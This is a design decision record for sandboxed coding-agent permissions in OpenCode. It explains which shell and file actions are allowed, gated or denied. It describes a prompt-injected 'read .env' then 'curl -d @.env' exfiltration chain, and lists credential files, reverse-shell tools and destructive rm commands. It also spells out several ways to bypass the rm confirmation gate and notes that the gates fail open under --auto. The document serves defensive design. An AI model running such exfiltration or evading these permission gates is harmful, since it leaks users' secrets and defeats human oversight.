# Decision: default-allow OpenCode permissions, tuned for the sandbox

**Status:** accepted

## Context

The `usai-provider` kit ships an `opencode.jsonc` that includes OpenCode's
`permission` policy. The original policy was a hardened, **default-deny/ask**
config: it denied reading credential files (`.env`, `*.pem`, `~/.aws/*`, …),
gated `git`, package managers, and builds behind `ask`, and hard-denied `sudo`,
`ssh`, `nc`, `rm`, `dd`, and dozens more. That policy was written for an
**untrusted-host** threat model — an agent that shares a filesystem and network
with the user's real machine and real secrets.

This kit does not run in that model. It runs **exclusively inside an sbx
sandbox**:

- an ephemeral container with **no access to the host filesystem**;
- a **proxied, allow-listed network** (egress is constrained by sbx, not by the
  agent's shell);
- **injected credentials** — the container never holds real key material; env
  values are placeholders or proxied.

In that setting, most of the original gates re-implement — weakly — protections
the sandbox already provides, at the cost of constant `ask` prompts. That
friction has its own security cost: it trains users to approve prompts
reflexively, which erodes the value of the one prompt that actually matters. The
exception is the `read` credential-file deny-list: it is a hard `deny` that costs
zero prompts and defends a gap the sandbox does *not* cover (see the Decision),
so we keep it.

## Decision

Adopt a **default-allow** permission policy, gating only the class of action the
sandbox boundary does **not** fully contain, while keeping one cheap,
zero-prompt data-exfil control (the `read` credential deny-list), plus two
narrowly-scoped `ask` gates added after the initial policy shipped (see
"Two additional `ask` gates" below).

- Top-level default `"*": "allow"`; `edit`, `webfetch`, `websearch` allow.
- The `read` tool keeps its **hard-`deny` credential-file list** (`.env`,
  `*.pem`, `*.key`, `*.tfvars`, `~/.aws/*`, kubeconfig, `.npmrc`,
  `.git-credentials`, …). This is the one deny we keep, because it costs **zero
  prompts** (deny, not ask — reading credentials is never the agent's job) and it
  is the only thing that breaks a prompt-injected `read .env` →
  `curl -d @.env <allowed-host>` chain, which the proxy allow-list *cannot* stop
  (see "Why keep the read-deny" below). Example files (`.env.example`, …) are
  allowed and ordered **last** so they win.
- `bash` default `"*": "allow"`.
- `bash` gates (`ask`) the outbound **"new destination"** commands that could
  push workspace contents somewhere a prompt-injected agent chose:
  `git push`, `git remote add`, `git remote set-url`, `gh pr create`, `gh api`,
  and `scp`/`sftp`/`rsync`/`nc`/`ncat`/`netcat`/`telnet`.
- `bash` also gates (`ask`) the **data-bearing forms** of `curl`/`wget`
  (`-d`/`--data`/`-F`/`--form`/`-T`/`--upload-file`/`-X POST|PUT`, and wget's
  `--post-data`/`--post-file`/`--body-*`) as **defense-in-depth** — explicitly
  *not* a claim of completeness (see below).
- **No hard `deny` rules in `bash`.** The sandbox, not a bash denylist, is the
  control for command execution; the only `deny` in the whole policy is the
  `read` credential list, which governs the read *tool*, not shell commands.

### Two additional `ask` gates, added after initial rollout

Two more gates were added at maintainer request, on top of the policy above,
each aimed at a residual risk class the sandbox boundary genuinely does
**not** cover (unlike the bulk of what this ADR argues is already contained):

**`gh pr merge*` / `gh api*/pulls/*/merge*` / `gh api*/merge*` → `ask`.**
Merging alters the **authoritative state of a shared, version-controlled
system outside the sandbox**, using a token whose privilege the sandbox
boundary does not mediate — the boundary confines the *container*, not the
*operations* a valid credential can perform against a remote API. This is a
**configuration-change-control concern (NIST SP 800-53 CM-3, secondarily
CM-5)**, not a least-privilege-inside-the-sandbox concern (AC-6) — merging is
gated on its own line, separate from the `gh api*` rule above, so the prompt
names the actual action rather than a generic "gh api call." **Reviewed by a
7-role multi-perspective panel (6 approve / 1 reject on a narrower framing
question, unanimous on this control mapping)**; the panel's strongest
argument for CM-3 over AC-6: a per-sandbox GitHub token is scoped to *hosts*
it can reach, not to *which API operations* it may invoke once it reaches
one, so the permission map — not the sandbox — is the only control point for
this specific action.

**`rm` outside the workspace (absolute path, `~`/`$HOME`-relative, or a
`..`-climbing relative path) → `ask`; in-workspace `rm` remains fully
allowed.** See "Why the `rm` gate is defense-in-depth, not AC-6 enforcement"
below for the full rationale and an explicit, disclosed limitation — the
panel that reviewed this was unanimous that it must **not** be presented as
directly implementing AC-6's "restricted to the project directory" language,
even though that is the more specific and more accurate control text to cite
than "the sandbox already covers it."

### The "new outbound destination" gate is a UX affordance, not a firewall

We deliberately do **not** try to enumerate every command that can send bytes
off-box. Egress is already bounded by the **sandbox proxy allow-list** — an
unknown host is simply unreachable, regardless of which binary tries. Playing
whack-a-mole with an `ask` list for every possible network tool would be endless
and would train reflexive approval, buying no real security over the proxy.

So the `ask` edges exist only as a **human-in-the-loop affordance for the
highest-frequency, highest-consequence "push my workspace to a *named* new
destination" actions** — `git push`/`gh` (the ones an agent reaches for
constantly) plus the classic copy/reverse-shell tools (`scp`/`rsync`/`nc`/…).

The following are **intentionally NOT gated** — they ride the *same* proxy
egress boundary, so gating them adds prompts without adding containment:

| Not gated | Why it's already contained |
|-----------|----------------------------|
| `aws s3 cp` / `aws s3 sync` | Destination host must be on the proxy allow-list. |
| `gcloud storage cp`, `gsutil cp` | Same — bounded by the proxy allow-list. |
| `az storage blob upload` | Same. |
| `docker push` / `podman push` | Registry host must be allow-listed; images are workspace-derived, not secret-material. |
| `dig` / `nslookup` | DNS is a possible covert channel, but the proxy/resolver bounds it; a per-command prompt is theater. |

If a deployment needs any of these gated, that is exactly what the re-gating
mixin (below) is for — it can add them without forking this kit.

### Why the `rm` gate is defense-in-depth, not AC-6 enforcement

The `rm`-outside-workspace gate (`rm -rf /`, `rm -rf ~/other-project`,
`rm -rf $HOME/x`, `rm -rf ../sibling`, and similar) was added because the
mount topology that enforces "no host filesystem" does not, by itself,
guarantee "restricted to *only* the project directory" the way NIST SP
800-53 **AC-6**'s canonical text puts it (`docs/SECURITY-CONTROLS.md` in the
playbook: *"File system access SHOULD be restricted to the project
directory"*). Inside the container there can be writable paths outside the
workspace — the merged global OpenCode config, `~/.config`, any additional
mount a particular backend or kit adds — that the container boundary permits
but the literal AC-6 sentence does not intend to scope in. Citing that
specific clause is more accurate than the original "the sandbox broadly
satisfies AC-6" framing this ADR shipped with; it names the exact property
being aimed at rather than leaning on the container boundary alone.

**But do not read the above as "this gate satisfies AC-6."** A 7-role
multi-perspective review panel evaluated this exact framing and was
unanimous on one point even where they otherwise disagreed: an `ask` gate is
a **human-confirmation prompt over a glob match on a bash command string** —
advisory, not enforcement — and it is adversarially trivial to route around,
non-maliciously or otherwise:

- `cd .. && rm -rf sibling` (the gate matches the string, not the resulting
  cwd)
- `sh -c 'rm -rf ~/x'` or any subshell/wrapper indirection
- `find .. -delete`, `xargs rm`, `python -c 'shutil.rmtree(...)'`, or any
  non-`rm` deletion primitive (the gate is `rm`-specific, not a filesystem
  boundary)
- variable indirection that hides the literal path text the glob matches on
  (`rm -rf "$(echo ~)"/x`)
- a symlink inside the workspace whose target resolves outside it

A control claim that fails this quickly should not be written into an ADR as
a control's primary satisfaction — an assessor who tests the claim breaks it
in one command, which is a **worse** outcome than the honest defense-in-depth
framing this ADR already used. The corrected, accurate statement: **the
sandbox's mount scope remains the primary, structurally-enforced
implementation of AC-6's filesystem restriction; the `rm` gate is a
secondary, non-enforcing, human-in-the-loop checkpoint against accidental
(not adversarial) destructive commands on the residual writable paths the
mount scope does not cover.** The two layers are complementary; neither
alone is AC-6's full implementation, and the gate's own limitation (the
bypass list above) is disclosed here rather than left for an assessor to
discover.

**Also disclosed:** OpenCode's own `ask` semantics fail **open**, not
closed, under automation — `opencode --auto` / `opencode run --auto`
"automatically approve[s] permission requests that are not explicitly
denied" (only `deny` rules survive `--auto`; see
[opencode.ai/docs/permissions](https://opencode.ai/docs/permissions/)). Both
new `ask` gates in this ADR — `rm` and `gh pr merge` — provide **zero**
protection in any workflow that runs with `--auto`. If this kit is ever
consumed by a fully autonomous, `--auto`-driven pipeline, the actual control
against an unattended destructive `rm` or an unattended merge has to live
elsewhere (a workspace-scoped credential/mount restriction for `rm`; branch
protection and required reviews on the remote for merge) — not in this
config, which is an interactive-session safeguard by construction.

### What is deliberately allowed (and why it's safe here)

- **Destructive/filesystem/privilege ops** (`dd`, `chmod`, `sudo`,
  `systemctl`, in-workspace `rm -rf`, …): blast radius is one ephemeral
  container. `rm -rf build` in a throwaway box is a self-own, not a breach.
  (Outside-workspace `rm` is the one exception — see above.)
- **`cat`/`less` of dotfiles / "secret" files**: allowed in `bash` (the read
  *tool* deny-list does not cover shell commands). Real credentials are injected,
  not on disk; the read-deny is a cheap extra layer, not a promise. The
  workspace *should* be a clone/worktree the user chose to mount, without real
  secrets — but a user may realistically mount a repo that carries a real
  `.env`/`*.pem`/`*.tfvars`. If the agent is prompt-injected, `read .env` →
  `curl -d @.env https://api.gsa.usai.gov` exfiltrates to a host that is **on
  the allow-list and accepts POST bodies**. The proxy allow-list — the only
  network control — cannot distinguish that malicious POST from legitimate
  model traffic. A hard `deny` on reading credential files cuts that chain at
  the source for free. Scope note (honest about what it is): the read-deny
  governs the **read tool**, not `bash`. `cat .env` in a shell is *not*
  blocked. It is therefore **belt-and-suspenders**, not a complete exfil
  block — the data-bearing curl/wget gates and the proxy allow-list are the
  other layers.
- **Package installs / builds / tests** (`npm`, `uv`, `pytest`, `make`,
  `cargo`, `docker`): the entire point of a coding agent. Supply-chain risk is
  bounded by the sandbox + egress allow-list, not by an `ask` prompt.
- **Benign `curl`/`wget` reads** (`GET`, no data flags): allowed. A glob cannot
  reliably tell a benign `GET` from an exfiltrating `POST` in every case (flag
  order, data smuggled in a GET URL, encodings), so the data-flag gates are
  **defense-in-depth, not an egress firewall** — the **proxy allow-list** is the
  real network control.
- **Secret-surfacing commands** (`env`, `printenv`, `git remote -v`,
  `git config --get`): allowed. In the sandbox these expose injected
  placeholders / proxied values, not real secret material — inspecting them is
  expected, not a leak. (This matches the sandbox's credential-injection design.)

### Relationship to least-privilege (`least-privilege-review`, AC-6)

This pack also ships deny-by-default review skills (`least-privilege-review`,
`secure-code-review`) and the playbook preaches AC-6. That is not a
contradiction: **least-privilege here is enforced jointly by the sbx boundary
(no host FS outside the workspace mount, proxied egress, injected creds) and,
for the residual gap the mount scope alone does not cover, by the `rm`
`ask`-gate described above** — not by a comprehensive permission-map denylist.
The deny-by-default review skills apply to the *code being reviewed*, not to
this sandbox's own shell. The permission map stays deliberately permissive for
everything else *because* a stronger control (the sandbox) sits underneath it;
the two new gates in this ADR are the two documented exceptions where the
sandbox does not, by itself, mediate the action in question.

### Residual risk (accepted)

A novel outbound command not in the `ask` list runs unprompted. This is bounded
by the sandbox's proxy egress allow-list (an unknown host is not reachable), and
the highest-consequence known outbound actions (`git push`/`gh`, now including
`gh pr merge`) are gated. Also accepted, and disclosed above rather than
hidden: the `gh pr merge` gate does not cover `git push` to a branch with
auto-merge already enabled, or `gh pr merge --auto`'s deferred-merge path —
closing that gap, if ever needed, means restricting the per-sandbox token's
merge scope at the credential layer, not adding more glob patterns here. And
both new `ask` gates provide no protection under `opencode --auto`/
`opencode run --auto`, which approves any request that isn't an explicit
`deny` (see the disclosure above). Accepted at FIPS-Low for a development
sandbox.

## Re-gating for stricter environments

This kit's default is intentionally sandbox-appropriate, not a
one-size-fits-all host-safe policy. Operators who want tighter controls should
**not fork this kit**. Instead, compose a **separate mixin** that contributes
`ask`/`deny` rules via a project-layer `<workspace>/.opencode/opencode.jsonc`.
OpenCode deep-merges that fragment *over* this kit's `OPENCODE_CONFIG`, and
evaluates the **last matching** permission rule (OpenCode's `evaluate` uses
`findLast` over the flattened rule list — see
`packages/opencode/src/permission`), so a re-gating fragment that loads after
this config wins. This is also why the shipped config places every `ask` edge
*after* the broad `"*": "allow"` — under last-matching-rule, order is
load-bearing. (See the companion co-tenancy decision record for the
merge/precedence contract.) This keeps the permissive default and the strict
overlay as independent, composable pieces.

## Consequences

- Far fewer approval prompts for routine, sandbox-contained work; the prompts
  that remain (`git push`/`gh`, `gh pr merge`, new remotes/channels, outside-
  workspace `rm`, data-bearing curl/wget) are the ones worth a human's
  attention.
- The policy is honest about what it is: sandbox-tuned, documented as such in the
  README, and not to be lifted into a non-sandboxed context unchanged. It is
  also honest about what the two newer `ask` gates are NOT: neither is a
  standalone implementation of the NIST control it's grounded in (AC-6 for
  `rm`, CM-3/CM-5 for `gh pr merge`) — both are human-in-the-loop checkpoints
  layered on top of a structural control (the sandbox mount scope; branch
  protection on the remote) that does the actual enforcing, and both fail
  open under `opencode --auto`.
- Encoded in `tests/opencode-permissions.test.mjs`, which models OpenCode's
  **last-matching-rule** semantics (not most-specific-wins) and asserts the
  default-allow posture, the specific `ask` edges (including `gh`, `gh pr
  merge`, outside-workspace `rm`, and the data-bearing curl/wget forms), the
  retained `read` credential deny-list, and that **`bash`** has no hard-deny
  rules. It includes a regression test proving a trailing broad `allow`
  reopens a gate — the failure mode that a most-specific-wins resolver would
  have hidden — and documents (in comments, not assertions, since they are
  not testable as static config) the `rm` gate's known bypass forms and the
  `--auto` fail-open behavior.

## Links

- Companion: `0002-opencode-config-co-tenancy.md` (the merge/precedence contract a
  re-gating mixin relies on)
